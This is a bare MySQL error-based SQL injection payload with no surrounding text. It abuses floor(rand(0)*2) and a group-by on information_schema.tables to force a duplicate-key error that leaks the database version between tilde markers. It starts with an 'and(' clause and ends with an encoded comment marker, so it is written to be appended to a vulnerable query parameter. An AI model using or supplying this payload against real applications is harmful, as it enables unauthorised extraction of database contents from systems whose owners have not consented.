and(
    select 1 from (
        select count(*), concat(  
            ( 
                select (
                    select (
                        select concat(0x7e, version(), 0x7e)
                    ) 
                ) from information_schema.tables limit 0, 1 
            ), 
            floor(rand(0) * 2)
        ) x from information_schema.tables group by x
    ) a
) % 23